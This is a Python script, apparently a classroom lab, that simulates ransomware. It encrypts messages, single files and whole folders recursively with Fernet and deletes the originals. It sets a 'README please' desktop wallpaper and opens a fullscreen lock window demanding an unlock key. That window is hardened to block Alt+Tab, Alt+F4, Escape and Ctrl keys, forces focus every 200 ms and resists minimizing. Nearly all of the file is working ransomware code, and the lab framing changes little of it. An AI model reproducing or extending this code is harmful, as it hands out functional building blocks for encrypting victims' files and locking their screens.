#!/usr/bin/env python3

# Import libraries
from pathlib import Path
from cryptography.fernet import Fernet
import os
from PIL import Image, ImageDraw, ImageFont
import ctypes
import tkinter as tk
import tkinter.messagebox as messagebox
from ctypes import windll
# 1Dirs
HOME = Path.home()
DESKTOP = HOME / "Desktop"
TARGET = HOME / "OneDrive" / "Desktop" / "lab8folder"
output = DESKTOP / "README_WALLPAPER.bmp"

# Key
KEY_PATH = DESKTOP / "key.key"

# key functions
def write_key():
    """
    Generate a Fernet key and save as key.key on Desktop
    """
    key = Fernet.generate_key()
    KEY_PATH.write_bytes(key)
    print(f"[+] Key saved at: {KEY_PATH}")
    return key

def load_key():
    """
    Load key.key from Desktop; return None if missing
    """
    if not KEY_PATH.exists():
        print("[!] key.key not found.")
        return None

    key = KEY_PATH.read_bytes()
    print(f"[+] Key loaded from: {KEY_PATH}")
    return key

def if_key():
    """
    Ensures a key exists. Loads it or generates a new one.
    Returns a Fernet instance.
    """
    key = load_key()
    if key is None:
        key = write_key()
    return Fernet(key)

# Encryption/Decryption functions
def encrypt_message():
    f = if_key()
    msg = input("Enter message to encrypt: ").encode()
    encrypted = f.encrypt(msg)
    print("\n[+] Encrypted message:\n", encrypted.decode())

def decrypt_message():
    f = if_key()
    token = input("Enter encrypted text: ").encode()
    try:
        decrypted = f.decrypt(token)
        print("\n[+] Decrypted message:\n", decrypted.decode())
    except:
        print("[!] Invalid encrypted text.")

def encrypt_file():
    f = if_key()
    path = Path(input("Enter file path to encrypt: ").strip())

    if not path.exists() or not path.is_file():
        print("[!] Invalid file.")
        return

    data = path.read_bytes()
    encrypted = f.encrypt(data)

    out = path.with_suffix(path.suffix + ".enc")
    out.write_bytes(encrypted)

    path.unlink()  # delete original
    print(f"[+] Encrypted file saved as {out}")
    
def decrypt_file():
    f = if_key()  
    enc_path = Path(input("Enter encrypted file path: ").strip())

  
    if not enc_path.exists() or not enc_path.is_file():
        print("[!] Invalid file.")
        return


    encrypted_data = enc_path.read_bytes()

    try:
        decrypted = f.decrypt(encrypted_data)
    except Exception:
        # Wrong key, corrupted file, or tampering
        print("[!] Decryption failed (wrong key or corrupted file).")
        return
    # Determine output file path by removing .enc extension
    if enc_path.suffix == ".enc":
        out_path = enc_path.with_suffix("")  
    else:
        # Fallback: if no .enc extension exists, append ".dec"
        out_path = enc_path.with_name(enc_path.name + ".dec")

    # Write the decrypted content to the output file
    out_path.write_bytes(decrypted)

    # Delete the encrypted file after successful decryption
    enc_path.unlink()

    print(f"[+] Decrypted file saved as {out_path}")
    print(f"[+] Encrypted file removed: {enc_path}")

def encrypt_folder():
    """
    Encrypts all files inside a folder (recursively).
    """
    f = if_key()
    folder_path = Path(input("Enter folder path to encrypt: ").strip())

    if not folder_path.exists() or not folder_path.is_dir():
        print("[!] Invalid folder.")
        return

    print(f"\n[+] Encrypting folder: {folder_path}\n")

    for file in folder_path.rglob("*"):
        if file.is_file():

            # prevent re-encrypting encrypted files
            if file.suffix == ".enc":
                continue

            try:
                data = file.read_bytes()
                encrypted = f.encrypt(data)

                out = file.with_suffix(file.suffix + ".enc")
                out.write_bytes(encrypted)

                file.unlink()  # remove original

                print(f"[+] Encrypted: {file}")

            except PermissionError:
                print(f"[!] Skipped (permission denied): {file}")
            except Exception as e:
                print(f"[!] Error with {file}: {e}")

    print("\n[✔] Folder encryption complete.")

def decrypt_folder():
    """
    Decrypts all .enc files inside a folder (recursively).
    """
    f = if_key()
    folder_path = Path(input("Enter folder path to decrypt: ").strip())

    if not folder_path.exists() or not folder_path.is_dir():
        print("[!] Invalid folder.")
        return

    print(f"\n[+] Decrypting folder: {folder_path}\n")

    for file in folder_path.rglob("*"):
        if file.is_file():

            # Only decrypt .enc files
            if file.suffix != ".enc":
                continue

            try:
                data = file.read_bytes()
                decrypted = f.decrypt(data)

                # remove the .enc extension → restore original filename
                original_path = file.with_suffix("")

                # Avoid accidental overwrites
                if original_path.exists():
                    print(f"[!] Skipping (target exists): {original_path}")
                    continue

                original_path.write_bytes(decrypted)
                file.unlink()  # delete encrypted file

                print(f"[+] Decrypted: {original_path}")

            except PermissionError:
                print(f"[!] Skipped (permission denied): {file}")
            except Exception as e:
                print(f"[!] Error with {file}: {e}")

    print("\n[✔] Folder decryption complete.")

# README Wallpaper Generation and Setting
def generate_readme_wallpaper(output_path=None):
    if output_path is None:
        desktop = Path.home() / "Desktop"
        output_path = desktop / "README_WALLPAPER.bmp"

    width, height = 1920, 1080
    img = Image.new("RGB", (width, height), (30, 30, 30))
    draw = ImageDraw.Draw(img)

    try:
        font = ImageFont.truetype("arialbd.ttf", 120)
    except:
        font = ImageFont.load_default()

    text = "README please"

    # Pillow >=10 replacement for textsize
    bbox = draw.textbbox((0, 0), text, font=font)
    tw = bbox[2] - bbox[0]  # text width
    th = bbox[3] - bbox[1]  # text height
    position = ((width - tw) // 2, (height - th) // 2)

    draw.text(position, text, fill="white", font=font)

    output_path.parent.mkdir(exist_ok=True)
    img.save(output_path, "BMP")

    print(f"[+] Wallpaper created at: {output_path}")

def set_wallpaper(path):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, str(path), 3)
    print(f"[+] Wallpaper applied: {path}")

# Fullscreen Popup 
def show_popup(message="YOUR FILES ARE ENCRYPTED"):
    """
    Simulated ransomware lockscreen.
    Improved anti-Alt+Tab, always-on-top, focus forcing.

    """

    root = tk.Tk()
    root.title("ALERT")
    root.configure(bg="black")

    # Fullscreen + remove borders
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.overrideredirect(True)  # remove close/minimize/maximize

    # Wrapper frame
    frame = tk.Frame(root, bg="black")
    frame.pack(expand=True, fill="both")

    # Main text
    tk.Label(
        frame,
        text=message,
        font=("Arial", 55, "bold"),
        fg="red",
        bg="black",
    ).pack(pady=50)

    # Ask for unlock key
    tk.Label(
        frame,
        text="Enter key to unlock:",
        font=("Arial", 25),
        fg="white",
        bg="black",
    ).pack(pady=10)

    entry = tk.Entry(frame, font=("Arial", 20), show="*", width=30)
    entry.pack(pady=20)
    entry.focus_set()

    def check_key():
        if entry.get() == "1234":  # demo unlock key
            root.destroy()
        else:
            messagebox.showerror("WRONG", "Invalid key!")

    tk.Button(
        frame,
        text="UNLOCK",
        font=("Arial", 25, "bold"),
        fg="white",
        bg="red",
        width=10,
        command=check_key,
    ).pack(pady=30)

    # -------------------------------
    # HARDENING SECTION
    # -------------------------------

    # 1. Prevent Alt+F4, Alt+Tab, Ctrl combinations, Escape
    def block_keys(event):
        return "break"

    banned_sequences = [
        "<Alt_L>", "<Alt_R>", "<Control_L>", "<Control_R>",
        "<Escape>", "<F4>", "<Alt-F4>", "<Control-F4>",
        "<Control-Tab>", "<Alt-Tab>"
    ]

    for seq in banned_sequences:
        root.bind_all(seq, block_keys)

    # 2. Force focus every 200 ms (prevents focus loss)
    def refocus():
        try:
            root.focus_force()
        except:
            pass
        root.after(200, refocus)

    root.after(200, refocus)

    # 3. Prevent window from being minimized
    def disable_minimize(event):
        try:
            root.state("normal")
        except:
            pass

    root.bind("<Unmap>", disable_minimize)

    # Keep most things blocked inside the window
    root.bind("<Alt-KeyPress>", block_keys)
    root.bind("<Control-KeyPress>", block_keys)

    # Start window
    root.mainloop()

# Menu
def menu():
    print("\nWhat would you like to do?")
    print("1 - Encrypt a message")
    print("2 - Decrypt a message")
    print("3 - Encrypt a file")
    print("4 - Decrypt a file")
    print("5 - Encrypt a folder")
    print("6 - Decrypt a folder")
    print("7 - Wallpaper & Popup")
    print("8 - Exit")

    choice = input("Choose: ").strip()

    if choice == "1":
        encrypt_message()
    elif choice == "2":
        decrypt_message()
    elif choice == "3":
        encrypt_file()
    elif choice == "4":
        decrypt_file()
    elif choice == "5":
        encrypt_folder()
    elif choice == "6":
        decrypt_folder()
    elif choice == "7":
        output = DESKTOP / "README_WALLPAPER.bmp"  
        generate_readme_wallpaper(output)          
        set_wallpaper(output)                       
        show_popup()
    elif choice == "8":
        print("Goodbye.")
        exit()
    else:
        print("[!] Invalid option.")



if __name__ == "__main__":
    try:
        while True:
            menu()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        exit()

